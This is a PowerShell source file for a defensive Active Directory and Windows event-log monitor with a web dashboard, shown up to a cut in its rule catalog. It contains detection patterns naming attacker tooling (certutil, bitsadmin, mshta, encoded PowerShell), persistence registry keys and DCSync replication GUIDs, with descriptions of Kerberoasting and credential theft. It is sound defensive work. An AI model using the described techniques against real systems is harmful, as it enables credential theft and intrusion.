# ============================================================================
# ALPHA SENTINEL v2.6.0 - AD / Network Attack Monitor (background service + web UI)
# ============================================================================
# A standalone Windows security monitor from the ALPHA Cybersecurity project.
# Like Wazuh's agent+dashboard model, but as ONE script with zero dependencies:
#
#   - Runs in the BACKGROUND (service-style, no window needed): polls the
#     Windows event logs every -PollSeconds and runs 30 AD/network detection
#     rule families (Kerberos attacks, spraying, brute force, privilege
#     escalation, DCSync, directory enumeration, persistence, defense evasion,
#     anti-forensics), and keeps alerts in memory + a history CSV so acks
#     survive restarts.
#   - Serves a MODERN WEB DASHBOARD on http://localhost:<Port> (default 8443)
#     BEHIND A LOGIN: local accounts in sentinel-users.json, PBKDF2-hashed, a
#     server-side session and an HttpOnly session cookie. Wazuh-style dark UI
#     with severity stat tiles, live search, severity/status filters,
#     auto-refresh, per-alert detail with MITRE ATT&CK mapping and remediation
#     guidance, a DETECTION COVERAGE table (every rule family + how often it
#     fired + whether this host can log it at all), acknowledge/unacknowledge,
#     a /api/self-test endpoint, and CSV export.
#   - Optionally forwards every detection to the ALPHA web platform
#     (separate private repo: Maty156/alpha) with the FULL normalised event
#     payload, so the platform's own rule engine matches it. Forwarding is
#     optional; without it Sentinel works fully standalone.
#
# The rule catalog below mirrors alpha/utils/detectionRules.js key-for-key -
# the two engines must stay in sync (same keys, severities and event IDs).
#
# QUICK START (as Administrator - reading the Security log requires elevation):
#   # enable audit categories once. Event ID -> Advanced Audit subcategory,
#   # the same map the built-in preflight checks (GET /api/preflight):
#   auditpol /set /subcategory:"Logon" /success:enable /failure:enable                      ; 4624 4625 4648
#   auditpol /set /subcategory:"Special Logon" /success:enable                              ; 4672
#   auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable      ; 4776
#   auditpol /set /subcategory:"Account Lockout" /success:enable /failure:enable            ; 4740
#   auditpol /set /subcategory:"User Account Management" /success:enable                    ; 4720 4722 4724 4725 4726 4738
#   auditpol /set /subcategory:"Security Group Management" /success:enable                  ; 4728 4729 4732 4733 4756
#   auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable ; 4768 4771
#   auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable         ; 4769
#   auditpol /set /subcategory:"Directory Service Access" /success:enable                   ; 4662
#   auditpol /set /subcategory:"Directory Service Changes" /success:enable                  ; 5141
#   auditpol /set /subcategory:"Other Object Access Events" /success:enable                 ; 4698
#   auditpol /set /subcategory:"Security System Extension" /success:enable                  ; 4697
#   auditpol /set /subcategory:"Registry" /success:enable                                   ; 4657
#   auditpol /set /subcategory:"Audit Policy Change" /success:enable                        ; 4719
#   auditpol /set /subcategory:"Security State Change" /success:enable                      ; 4616
#   auditpol /set /subcategory:"MPSSVC Rule-Level Policy Change" /success:enable            ; 4946 4947 4948 4949 4950
#
#   # 1100 / 1102 are written by the Eventlog service to the SECURITY log and
#   # are not gated by an Advanced Audit subcategory; 7045 comes from the
#   # Service Control Manager in the SYSTEM log; Defender's 5001/5010/5012 live
#   # in the Defender OPERATIONAL channel. No auditpol entry is needed for any
#   # of those - and 1100 was previously polled from System, where it never
#   # appears, so that rule could never fire.
#
#   # FIRST RUN: create the dashboard account (the web UI is not served until a
#   # users file exists - it will not fall back to being an open port). The
#   # generated password is shown ONCE; save it.
#   .\New-SentinelAdmin.ps1                      # user "admin", random password
#   .\New-SentinelAdmin.ps1 -Username maty       # or your own username
#
#   # run in the BACKGROUND (no console window; -Background hides it and
#   # writes sentinel.pid so -Stop can find the process later):
#   powershell -ExecutionPolicy Bypass -File .\AlphaSentinel.ps1 -Background
#
#   # or run in the FOREGROUND with a small console window:
#   powershell -ExecutionPolicy Bypass -File .\AlphaSentinel.ps1
#
#   # then open:  http://localhost:8443   and sign in
#   #             (the dashboard binds to LOCALHOST by default and only accepts
#   #              loopback Host headers. -Bind 0.0.0.0 serves the LAN: over
#   #              plain HTTP the password and cookie are UNENCRYPTED, so use a
#   #              VPN / trusted lab network or a TLS reverse proxy.)
#
# Optional flags:
#   -Port 8443                  web dashboard port
#   -Bind localhost              interface to bind ('localhost', '0.0.0.0', or an IP)
#   -PollSeconds 15             event-log poll interval
#   -MaxEventsPerPoll 500       cap events parsed per poll (oldest first)
#   -CatchUpMilliseconds 200    when a poll was capped, retry this soon instead
#                               of waiting a whole -PollSeconds
#   -Background                 run with no console window (service-style)
#   -Stop                       stop a running background monitor and exit
#   -ForwardUrl / -ForwardKey   forward detections to the ALPHA web platform
#   -HistoryFile                alert history CSV (default sentinel-history.csv)
#   -StateFile                  per-channel poll watermarks + runtime state
#                               (sentinel-state.json)
#   -UsersFile                  dashboard accounts (sentinel-users.json)
#   -AuthFile                   login audit trail (sentinel-auth.csv)
#   -ReplayPath <file|dir>      replay exported event XML (wevtutil) through the
#                               real rule engine, print an alert report, exit
#
# LOGIN / SESSION MODEL:
#   - accounts in sentinel-users.json: PBKDF2 (per-user 16-byte salt, >= 100000
#     iterations); only salt + hash + iterations are stored
#   - POST /api/login -> a session id (32 random bytes) kept in memory, 8h
#     absolute lifetime, 30 min sliding idle timeout, cookie
#     sentinel_session=<id>; Path=/; HttpOnly; SameSite=Strict
#   - POST /api/logout destroys it. Every /api/* route except /api/health and
#     POST /api/login answers 401 without a live session.
#   - 5 failed logins per source IP per 5 minutes -> 429 for 5 minutes. Failures
#     and successes are audited to sentinel-auth.csv (IP + username, never the
#     password), and the same error is returned for a bad username and a bad
#     password.
#   - state-changing routes stay POST-only and same-origin; on a loopback bind
#     only loopback Host headers are accepted (DNS-rebinding guard).
#
# STOP the background monitor (either works):
#   powershell -ExecutionPolicy Bypass -File .\AlphaSentinel.ps1 -Stop
#   Stop-Sentinel   (helper function, when running in the same session)
# ============================================================================

param(
  [int]$Port = 8443,
  # Default bind is LOCALHOST, and the dashboard is behind a real login now (see
  # the AUTHENTICATION section) rather than a token that travelled with the
  # page. Serving the LAN is opt-in via -Bind.
  [string]$Bind = "localhost",
  [int]$PollSeconds = 15,
  [int]$MaxEventsPerPoll = 500,
  # When a poll had to defer events (cap reached) the next poll runs this soon
  # instead of waiting a whole -PollSeconds.
  [int]$CatchUpMilliseconds = 200,
  [switch]$Background,
  [switch]$Stop,
  [string]$ForwardUrl = "",
  [string]$ForwardKey = "",
  [string]$HistoryFile = "",
  [string]$StateFile = "",
  [string]$UsersFile = "",
  [string]$AuthFile = "",
  [string]$ReplayPath = "",
  # Maximum size of sentinel-history.csv in MB before rotation (default 25)
  [int]$HistoryMaxMB = 25,
  # The dashboard shows a "DEMO DATA" marker ONLY when the operator says this is
  # a lab demo. Production never invents numbers; an empty dashboard says it is
  # empty (see the v2.3 front end).
  [switch]$DemoData,
  # Enable the audit subcategories the rules need (opt-in: nothing is changed
  # without this switch). Refuses without Administrator, backs up the current
  # policy first, only ever turns things ON, and only what a rule needs.
  [switch]$EnableAudit,
  # Restore an audit-policy backup written by -EnableAudit
  # (auditpol /restore /file:<that file>).
  [string]$RestoreAudit = "",
  # Skip all interactive prompts (first-run setup, audit policy prompt).
  # Useful for CI/CD or non-interactive environments.
  [switch]$Unattended
)

if (-not $HistoryFile -and $PSScriptRoot) {
  $HistoryFile = Join-Path $PSScriptRoot "sentinel-history.csv"
}
if (-not $StateFile) {
  $StateFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-state.json" } else { "sentinel-state.json" }
}
if (-not $UsersFile) {
  $UsersFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-users.json" } else { "sentinel-users.json" }
}
if (-not $AuthFile) {
  $AuthFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-auth.csv" } else { "sentinel-auth.csv" }
}
$PidFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel.pid" } else { "sentinel.pid" }

# ---- VERSION CHECK ----
# Require Windows PowerShell 5.1 or later
if ($PSVersionTable.PSVersion.Major -lt 5 -or ($PSVersionTable.PSVersion.Major -eq 5 -and $PSVersionTable.PSVersion.Minor -lt 1)) {
  Write-Host "ERROR: Alpha Sentinel requires Windows PowerShell 5.1 or later." -ForegroundColor Red
  Write-Host "Current version: $($PSVersionTable.PSVersion)" -ForegroundColor Red
  exit 1
}

# ------------------------------------------------------------
# STOP HELPER (defined early so it exists even in a -ReplayPath run)
# ------------------------------------------------------------
# The old Stop-Sentinel was a function that only existed INSIDE the running
# monitor's process, so "run Stop-Sentinel from any console" (as the README
# said) could never work from a second window. It now reads the pid file the
# monitor writes, with a command-line scan as a fallback, so both
#   .\AlphaSentinel.ps1 -Stop      and      Stop-Sentinel
# work from any console.
function global:Stop-Sentinel {
  if (Test-Path $PidFile) {
    $targetPid = 0
    [void][int]::TryParse("$((Get-Content -Raw $PidFile -ErrorAction SilentlyContinue)).Trim()", [ref]$targetPid)
    if ($targetPid -gt 0) {
      $proc = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
      if ($proc) {
        # Verify the PID belongs to a powershell/pwsh process running AlphaSentinel
        $cmdLine = $proc.CommandLine
        if ($cmdLine -and ($cmdLine -like '*AlphaSentinel.ps1*' -or $cmdLine -like '*AlphaSentinel*')) {
          Stop-Process -Id $targetPid -Force -ErrorAction SilentlyContinue
          Write-Host "stopped sentinel process $targetPid"
          Remove-Item $PidFile -Force -ErrorAction SilentlyContinue
          return
        } else {
          Write-Host "PID $targetPid does not belong to an AlphaSentinel process (command line: $cmdLine). Removing stale pid file."
          Remove-Item $PidFile -Force -ErrorAction SilentlyContinue
        }
      }
    }
    Remove-Item $PidFile -Force -ErrorAction SilentlyContinue
  }
  # fallback: locate it by command line (covers a run that never wrote a pid)
  Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe' OR Name = 'pwsh.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*AlphaSentinel.ps1*' -and $_.ProcessId -ne $PID } |
    ForEach-Object {
      Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
      Write-Host "stopped sentinel process $($_.ProcessId)"
    }
}

if ($Stop) {
  Write-Host "Stopping ALPHA Sentinel..."
  Stop-Sentinel
  exit 0
}

# Windows PowerShell 5.1 defaults to TLS 1.0/1.1 on older builds, which the
# hosted ALPHA platform refuses - without this, web forwarding fails on
# Server 2012 R2 / 2008 R2 with an unhelpful connection error.
try {
  [Net.ServicePointManager]::SecurityProtocol =
    [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
} catch { }

# ============================================================
# DETECTION RULES (36 families)
# ============================================================
# Mirrors alpha/utils/detectionRules.js. Keys must match exactly so an alert
# promoted in either product lands on the same rule_key.
$PrivilegedGroups = @(
  'domain admins', 'enterprise admins', 'schema admins', 'administrators',
  'account operators', 'backup operators', 'server operators',
  'print operators', 'group policy creator owners', 'dnsadmins',
  'exchange organization administrators', 'replicator'
)

# Extended rights for directory replication - requesting these is DCSync.
$ReplicationGuids = @(
  '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
  '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
  '89e95b76-444d-4c62-991a-0facbeda640c'
)

$SensitivePrivileges = @(
  'sedebugprivilege', 'setcbprivilege', 'sebackupprivilege', 'serestoreprivilege',
  'seloaddriverprivilege', 'setakeownershipprivilege', 'seimpersonateprivilege',
  'seassignprimarytokenprivilege', 'secreatetokenprivilege', 'sedenydebugprivilege'
)

# Machine accounts end in '$' (DC01$, WKS04$). A DC replicating directory
# changes is legitimate (that is what DCs DO), and a computer account logging
# on remotely is not lateral movement - so several rules must skip them.
$MachineAccountRegex = '\$$'
# Principals that log on / take privileges constantly by design. They produced
# the 4624 and 4672 noise in the first build.
$SystemAccountRegex = '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|ANONYMOUS LOGON|DWM-\d+|UMFD-\d+|IUSR.*|IWAM.*|\-)$'
# Service-account name shapes: used to stop routine type-3 network logons by
# scheduled-task/service accounts being reported as lateral movement.
$ServiceLikeRegex = '(?i)^(svc|service|app|sql|backup|sccm|vss|mssql|web|job|task|nagios|zabbix|splunk|veeam|commvault)[-_.]|[_.-](svc|service|app|backup|sql)$'

# ------------------------------------------------------------
# AUDIT-POLICY PREFLIGHT MAP (rule family -> Advanced Audit subcategory)
# ------------------------------------------------------------
# Every detection here can only fire if Windows actually WRITES the event, and
# an event is only written when its Advanced Audit subcategory has the right
# Success/Failure setting. A subcategory left at "No Auditing" makes the rule
# blind no matter how correct its logic is - the single most common reason a
# detection "never fires" on a lab DC.
#
# Sub = the subcategory (or subcategories) the rule's event IDs live under;
# Need = the setting that must be present for the events the rule needs.
# Sub = $null means the event is NOT gated by audit policy (the Eventlog
# service writes 1100/1102 itself; Defender's events live in the Defender
# OPERATIONAL channel), so there is nothing to check and it is never "blind".
$RuleAudit = @{
  password_spraying           = @{ Sub = @('Logon'); Need = 'Failure' }
  brute_force_single_account  = @{ Sub = @('Logon'); Need = 'Failure' }
  kerberos_preauth_spraying   = @{ Sub = @('Kerberos Authentication Service'); Need = 'Failure' }
  ntlm_failed_auth            = @{ Sub = @('Credential Validation'); Need = 'Failure' }
  account_lockout_storm       = @{ Sub = @('Account Lockout'); Need = 'Success' }
  privilege_escalation        = @{ Sub = @('Security Group Management'); Need = 'Success' }
  account_created             = @{ Sub = @('User Account Management'); Need = 'Success' }
  account_control_changed     = @{ Sub = @('User Account Management'); Need = 'Success' }
  account_enabled_disabled    = @{ Sub = @('User Account Management'); Need = 'Success' }
  password_reset_by_admin     = @{ Sub = @('User Account Management'); Need = 'Success' }
  group_membership_removed    = @{ Sub = @('Security Group Management'); Need = 'Success' }
  account_deleted             = @{ Sub = @('User Account Management'); Need = 'Success' }
  kerberoasting               = @{ Sub = @('Kerberos Service Ticket Operations'); Need = 'Success' }
  asrep_roasting              = @{ Sub = @('Kerberos Authentication Service'); Need = 'Success' }
  dcsync_replication          = @{ Sub = @('Directory Service Access'); Need = 'Success' }
  ldap_recon                  = @{ Sub = @('Directory Service Access', 'Directory Service Changes'); Need = 'Success' }
  suspicious_remote_logon     = @{ Sub = @('Logon'); Need = 'Success' }
  explicit_credential_logon   = @{ Sub = @('Logon'); Need = 'Success' }
  service_abuse               = @{ Sub = @('Security System Extension'); Need = 'Success' }
  scheduled_task_created      = @{ Sub = @('Other Object Access Events'); Need = 'Success' }
  registry_persistence        = @{ Sub = @('Registry'); Need = 'Success' }
  log_tampering               = @{ Sub = $null; Need = $null }
  audit_policy_changed        = @{ Sub = @('Audit Policy Change'); Need = 'Success' }
  eventlog_service_stopped    = @{ Sub = $null; Need = $null }
  defender_disabled           = @{ Sub = $null; Need = $null }
  firewall_disabled           = @{ Sub = @('MPSSVC Rule-Level Policy Change'); Need = 'Success' }
  anonymous_smb_session       = @{ Sub = @('Logon'); Need = 'Success' }
  firewall_rule_modified      = @{ Sub = @('MPSSVC Rule-Level Policy Change'); Need = 'Success' }
  system_time_changed         = @{ Sub = @('Security State Change'); Need = 'Success' }
  special_privileges_assigned = @{ Sub = @('Special Logon'); Need = 'Success' }
  gpo_or_admin_object_modified = @{ Sub = @('Directory Service Changes'); Need = 'Success' }
  computer_account_abuse      = @{ Sub = @('Computer Account Management'); Need = 'Success' }
  suspicious_process_creation = @{ Sub = @('Process Creation'); Need = 'Success' }
  powershell_scriptblock      = @{ Sub = @('PowerShell Script Block Logging'); Need = 'Success' }
  dsrm_password_set           = @{ Sub = @('User Account Management'); Need = 'Success' }
  pass_the_hash_logon         = @{ Sub = @('Logon'); Need = 'Success' }
}

$SuspiciousServicePath = 'powershell|pwsh|cmd\.exe|wmic|mshta|rundll32|regsvr32|certutil|bitsadmin|net\.exe|-enc\b|/c\s|\\temp\\|\\users\\public\\|\\appdata\\|\\programdata\\|\\windows\\tasks'
$PersistenceRegistryKey = 'currentversion\\run(once)?|image file execution options|\\winlogon\\|explorer\\user shell folders|explorer\\shell folders|\\services\\.+\\parameters|\\policies\\system\\|\\lsa\\'

$SevRank = @{ 'Critical' = 0; 'High' = 1; 'Medium' = 2; 'Low' = 3 }

$RuleMeta = @{
  # ---- Credential access: brute force / spraying ----
  password_spraying = @{
    Severity = 'High'; Title = 'Suspicious Password Spraying Activity'
    EventId = '4625'; EventIds = @('4625'); DedupeMinutes = 15
    Mitre = 'T1110.003 - Brute Force: Password Spraying'; Category = 'Credential Access'
    Description = 'One source tried a small number of passwords across many different accounts - the classic spray pattern that stays under per-account lockout thresholds.'
    Remediation = 'Enable an account lockout threshold, block the source IP at the perimeter, and move the targeted accounts to smart-card or MFA-backed authentication.'
  }
  brute_force_single_account = @{
    Severity = 'Medium'; Title = 'Repeated Failed Logons Against One Account'
    EventId = '4625'; EventIds = @('4625'); DedupeMinutes = 15
    Mitre = 'T1110.001 - Brute Force: Password Guessing'; Category = 'Credential Access'
    Description = 'A single account accumulated a high number of failed logons in a short window - concentrated guessing rather than a broad spray.'
    Remediation = 'Confirm the account is not locked out while an attack continues, check whether the source is internal, and enforce lockout plus MFA on the account.'
  }
  kerberos_preauth_spraying = @{
    Severity = 'High'; Title = 'Kerberos Pre-Authentication Spraying'
    EventId = '4771'; EventIds = @('4771'); DedupeMinutes = 15
    Mitre = 'T1110.003 - Brute Force: Password Spraying'; Category = 'Credential Access'
    Description = 'Multiple accounts failed Kerberos pre-authentication from the same client address - spraying against the Kerberos AS instead of NTLM, which 4625-based rules miss.'
    Remediation = 'Apply the same lockout and MFA hardening as for NTLM spraying, and monitor 4771 alongside 4625 - attackers switch protocols to dodge single-event-id rules.'
  }
  ntlm_failed_auth = @{
    Severity = 'High'; Title = 'NTLM Authentication Failure Burst'
    EventId = '4776'; EventIds = @('4776'); DedupeMinutes = 15
    Mitre = 'T1110.001 - Brute Force: Password Guessing'; Category = 'Credential Access'
    Description = 'A workstation produced a burst of FAILED NTLM credential validations - either guessing locally from that host or relayed attempts to it. Only non-zero status codes count: 4776 also logs SUCCESSFUL validations (Status 0x0), which are normal NTLM traffic and are now ignored instead of being counted as a failure burst.'
    Remediation = 'Isolate the source workstation, review its running processes for credential-access tooling, and work toward disabling NTLM where the environment allows it.'
  }
  account_lockout_storm = @{
    Severity = 'High'; Title = 'Account Lockout Storm'
    EventId = '4740'; EventIds = @('4740'); DedupeMinutes = 15
    Mitre = 'T1110 - Brute Force'; Category = 'Credential Access'
    Description = 'Several distinct accounts locked out inside the same window - sprays that overshoot the lockout threshold leave this fingerprint behind.'
    Remediation = 'Treat as an in-progress password spraying campaign: find and block the source, and raise the lockout observation window in your SIEM.'
  }

  # ---- Privilege escalation / identity ----
  privilege_escalation = @{
    Severity = 'Critical'; Title = 'User Added to Privileged Group'
    EventId = '4728/4732/4756'; EventIds = @('4728', '4732', '4756'); DedupeMinutes = 15
    Mitre = 'T1078.002 - Valid Accounts: Domain Accounts'; Category = 'Privilege Escalation'
    Description = 'An account was added to a group that carries administrative rights over the domain or its member servers - a primary way an intruder converts a normal account into a lasting foothold.'
    Remediation = 'Verify the change was an approved ticket, remove the membership if it was not, reset the added account password, and hunt for lateral movement from that account.'
  }
  account_created = @{
    Severity = 'High'; Title = 'New Account Created'
    EventId = '4720'; EventIds = @('4720'); DedupeMinutes = 15
    Mitre = 'T1136.002 - Create Account: Domain Account'; Category = 'Persistence'
    Description = 'A new USER account was created. Computer accounts (names ending in $) are excluded - they are created every time a workstation or server joins the domain, which made this rule fire on routine provisioning. Attackers use throwaway user accounts as a persistence mechanism that survives password resets on the original victim account.'
    Remediation = 'Confirm the account against your joiner/mover/leaver process, and disable it immediately if there is no matching request. Watch for it being added to a privileged group next.'
  }
  account_control_changed = @{
    Severity = 'High'; Title = 'Account Security Flags Weakened'
    EventId = '4738'; EventIds = @('4738'); DedupeMinutes = 15
    Mitre = 'T1098 - Account Manipulation'; Category = 'Defense Evasion'
    Description = 'An account had a risky security flag turned ON. Only flags that actually CHANGED are considered (new value AND NOT old value), so editing an account that already carried the flag no longer fires. The risky transitions are do-not-require-Kerberos-pre-auth (AS-REP roastable), password-not-required, and clearing the Account-Disabled bit (re-enable).'
    Remediation = 'Revert the flag. For "do not require Kerberos pre-authentication", treat it as credential theft prep: rotate the account password after clearing the flag.'
  }
  account_enabled_disabled = @{
    Severity = 'Medium'; Title = 'Account Enabled or Disabled'
    EventId = '4722/4725'; EventIds = @('4722', '4725'); DedupeMinutes = 15
    Mitre = 'T1098 - Account Manipulation'; Category = 'Identity Abuse'
    Description = 'An account was enabled or disabled. Re-enabling a dormant or terminated employee account is a common re-entry technique.'
    Remediation = 'Check that the account belongs to an active employee and that the change came from an authorized administrator session.'
  }
  password_reset_by_admin = @{
    Severity = 'Medium'; Title = 'Password Reset by an Administrator'
    EventId = '4724'; EventIds = @('4724'); DedupeMinutes = 15
    Mitre = 'T1098 - Account Manipulation'; Category = 'Identity Abuse'
    Description = 'An administrator reset another account password - legitimate for helpdesk, but also how an intruder takes over an account they cannot crack.'
    Remediation = 'Confirm the reset against a helpdesk ticket, and verify the administrator session that performed it was not itself compromised.'
  }
  group_membership_removed = @{
    Severity = 'Medium'; Title = 'Account Removed from Privileged Group'
    EventId = '4729/4733'; EventIds = @('4729', '4733'); DedupeMinutes = 15
    Mitre = 'T1531 - Account Access Removal'; Category = 'Impact'
    Description = 'An account was removed from a privileged group. Beyond plain de-provisioning, this is used to lock the real incident responders out during an intrusion.'
    Remediation = 'Verify the removal was authorized and that no legitimate administrator lost access unexpectedly during an active incident.'
  }
  account_deleted = @{
    Severity = 'Medium'; Title = 'Account Deleted'
    EventId = '4726'; EventIds = @('4726'); DedupeMinutes = 15
    Mitre = 'T1531 - Account Access Removal'; Category = 'Impact'
    Description = 'An account was deleted. Used to clean up attacker-created accounts before an engagement ends, or to destroy a record of who had access.'
    Remediation = 'Confirm the deletion matches an offboarding request, check whether the account was created recently (a sign it was attacker-owned), and review what it accessed.'
  }

  # ---- Kerberos / directory ----
  kerberoasting = @{
    Severity = 'Medium'; Title = 'Kerberos Service Ticket Request (Kerberoasting)'
    EventId = '4769'; EventIds = @('4769'); DedupeMinutes = 15
    Mitre = 'T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting'; Category = 'Credential Access'
    Description = 'A SUCCESSFUL service ticket request used weak RC4 (0x17) encryption for a user-owned service principal - that ticket is then cracked offline for the service account password. Machine accounts ($), krbtgt and failed requests are excluded. One ticket is Medium; three or more distinct service principals requested by the same account inside 10 minutes raises the alert to High.'
    Remediation = 'Move service accounts to group-managed service accounts (gMSA) with AES keys, disable RC4 where possible, and rotate the targeted service account password.'
  }
  asrep_roasting = @{
    Severity = 'High'; Title = 'AS-REP Roasting (No-Preauth Ticket Request)'
    EventId = '4768'; EventIds = @('4768'); DedupeMinutes = 15
    Mitre = 'T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting'; Category = 'Credential Access'
    Description = 'A TGT was issued for an account with Kerberos pre-authentication disabled (PreAuthType 0). That response is encrypted with the account password hash and can be cracked offline, so a SINGLE successful request is enough to alert - the old rule waited for 3 hits on the same account and so missed a normal one-shot roast.'
    Remediation = 'Turn "Do not require Kerberos pre-authentication" back on for the account, rotate its password, and report on any other account with pre-auth disabled.'
  }
  dcsync_replication = @{
    Severity = 'Critical'; Title = 'Directory Replication Rights Used (DCSync)'
    EventId = '4662'; EventIds = @('4662'); DedupeMinutes = 15
    Mitre = 'T1003.006 - OS Credential Dumping: DCSync'; Category = 'Credential Access'
    Description = 'A NON-MACHINE account exercised Active Directory replication extended rights. On a real 4662 the right that was used is listed in the Properties field (ObjectType holds the object class), so the replication GUIDs are matched there. Domain controllers replicate as their machine account (ending in $) and are excluded - anything else is an attacker pulling password hashes with DCSync.'
    Remediation = 'Treat as a confirmed compromise: identify the account and host, disable the account, rotate the KRBTGT password twice, and audit who holds replication rights.'
  }
  ldap_recon = @{
    Severity = 'Medium'; Title = 'LDAP / SAMR Domain Enumeration'
    EventId = '4662/5141'; EventIds = @('4662', '5141'); DedupeMinutes = 30
    Mitre = 'T1018 - Remote System Discovery / T1087 - Account Discovery'; Category = 'Discovery'
    Description = 'A single source read a large number of directory objects in a short window - the fingerprint of enumeration tooling mapping users, groups and computers before an attack.'
    Remediation = 'Restrict anonymous SAMR/LDAP access by GPO, and hunt the source host for BloodHound / SharpHound output and other reconnaissance tooling.'
  }

  # ---- Lateral movement / execution ----
  suspicious_remote_logon = @{
    Severity = 'Medium'; Title = 'Suspicious Remote Logon'
    EventId = '4624'; EventIds = @('4624'); DedupeMinutes = 15
    Mitre = 'T1021 - Remote Services'; Category = 'Lateral Movement'
    Description = 'A remote desktop logon (type 10) by a non-machine account, or an administrative network logon (type 3) by a non-service account. Machine accounts ($) and service-account naming patterns (svc-, app_, sql*, backup*, ...) are excluded because they log on routinely, and repeats are deduplicated per account + source IP rather than per rule, so a second source is no longer swallowed.'
    Remediation = 'Confirm the logon is expected, restrict RDP by firewall/GPO, and require MFA for all administrative remote access.'
  }
  explicit_credential_logon = @{
    Severity = 'Medium'; Title = 'Explicit Credential Use (RunAs / Alternate Credentials)'
    EventId = '4648'; EventIds = @('4648'); DedupeMinutes = 15
    Mitre = 'T1078.003 - Valid Accounts: Local Accounts'; Category = 'Lateral Movement'
    Description = 'A process started with explicitly supplied credentials against a privileged or service account - how runas, PsExec-style tooling and pass-the-hash movement appear.'
    Remediation = 'Trace the parent process that launched it, and remove standing local administrator rights from workstations so explicit-credential movement has nothing to harvest.'
  }
  service_abuse = @{
    Severity = 'Medium'; Title = 'Suspicious Service Creation/Modification'
    EventId = '4697/7045'; EventIds = @('4697', '7045'); DedupeMinutes = 15
    Mitre = 'T1543.003 - Create or Modify System Process: Windows Service'; Category = 'Persistence'
    Description = 'A new Windows service was installed. Services run as SYSTEM at boot, which makes them a favourite persistence and privilege-escalation mechanism.'
    Remediation = 'Audit the service binary path and hash, restrict service creation to administrators, and look for encoded PowerShell or user-writable directories in the path.'
  }

  # ---- Persistence ----
  scheduled_task_created = @{
    Severity = 'High'; Title = 'Scheduled Task Created'
    EventId = '4698'; EventIds = @('4698'); DedupeMinutes = 15
    Mitre = 'T1053.005 - Scheduled Task/Job: Scheduled Task'; Category = 'Persistence'
    Description = 'A new scheduled task was registered - a durable way to re-execute code after reboot or after the original session is gone.'
    Remediation = 'Review the task action and its author, delete anything not backed by a change request, and monitor task creation for non-administrative accounts.'
  }
  registry_persistence = @{
    Severity = 'High'; Title = 'Registry Autorun / Persistence Key Modified'
    EventId = '4657'; EventIds = @('4657'); DedupeMinutes = 15
    Mitre = 'T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys'; Category = 'Persistence'
    Description = 'A registry key used for autostart or execution hijacking (Run/RunOnce, IFEO, Winlogon, service parameters) was modified.'
    Remediation = 'Inspect the value written, remove it if unauthorized, and restrict registry write access to these keys through GPO.'
  }

  # ---- Defense evasion / anti-forensics ----
  log_tampering = @{
    Severity = 'Critical'; Title = 'Security Log Cleared (Anti-Forensics)'
    EventId = '1102'; EventIds = @('1102'); DedupeMinutes = 60
    Mitre = 'T1070.001 - Indicator Removal: Clear Windows Event Logs'; Category = 'Defense Evasion'
    Description = 'The Security event log was cleared. There is almost no benign reason to do this mid-engagement - assume the attacker is destroying evidence of what came before.'
    Remediation = 'Treat as an active intrusion: isolate the host, preserve whatever logs remain (forward them off-host first), and review what the cleared window contained.'
  }
  audit_policy_changed = @{
    Severity = 'Critical'; Title = 'Audit Policy Changed'
    EventId = '4719'; EventIds = @('4719'); DedupeMinutes = 60
    Mitre = 'T1562.002 - Impair Defenses: Disable Windows Event Logging'; Category = 'Defense Evasion'
    Description = 'The system audit policy was modified - the standard first step before an attack, used to blind the very detections running on this host.'
    Remediation = 'Revert the policy to the approved baseline, push audit configuration by GPO rather than locally, and treat the change as intentional preparation for an attack.'
  }
  eventlog_service_stopped = @{
    Severity = 'Medium'; Title = 'Event Log Service Stopped'
    EventId = '1100'; EventIds = @('1100'); DedupeMinutes = 60
    Mitre = 'T1562.001 - Impair Defenses: Disable or Modify Tools'; Category = 'Defense Evasion'
    Description = 'The Windows Event Log service shut down, which halts auditing until it restarts. Attackers stop it to operate without generating events.'
    Remediation = 'Confirm whether this was a planned service restart, and alert on unexpected stops - a monitor running on the host cannot see events while the service is down.'
  }
  defender_disabled = @{
    Severity = 'Critical'; Title = 'Windows Defender Protection Disabled'
    EventId = '5001/5010/5012'; EventIds = @('5001', '5010', '5012'); DedupeMinutes = 60
    Mitre = 'T1562.001 - Impair Defenses: Disable or Modify Tools'; Category = 'Defense Evasion'
    Description = 'Real-time or on-access antivirus protection was turned off - either by an administrator, a policy problem, or an attacker clearing the way for tooling.'
    Remediation = 'Re-enable protection (and check Group Policy is enforcing it), then investigate what ran while it was off. Tamper protection blocks this in most current builds.'
  }

  # ---- Impact / configuration ----
  # Event 4950 shares the 'MPSSVC Rule-Level Policy Change' subcategory with
  # 4946-4949 (Microsoft Learn lists it under that subcategory), so enabling the
  # audit subcategory for firewall_rule_modified covers this rule too - no new
  # subcategory is needed. The fields are the ones the real event carries
  # (Microsoft Learn event XML): ProfileChanged, SettingType, SettingValue; the
  # firewall-off case is SettingType 'EnableFirewall' with SettingValue 'No'
  # ('Enable Windows Firewall'/'No' on some builds, '0' on the oldest ones).
  firewall_disabled = @{
    Severity = 'Critical'; Title = 'Windows Firewall Profile Disabled'
    EventId = '4950'; EventIds = @('4950'); DedupeMinutes = 15
    Mitre = 'T1562.004 - Impair Defenses: Disable or Modify System Firewall'; Category = 'Defense Evasion'
    Description = 'A whole firewall profile was turned OFF (SettingType EnableFirewall, value No). This is the classic pre-attack move - ransomware and lateral-movement tooling disable the firewall before spreading. Individual rule changes are covered by firewall_rule_modified; this rule only fires for the profile on/off switch.'
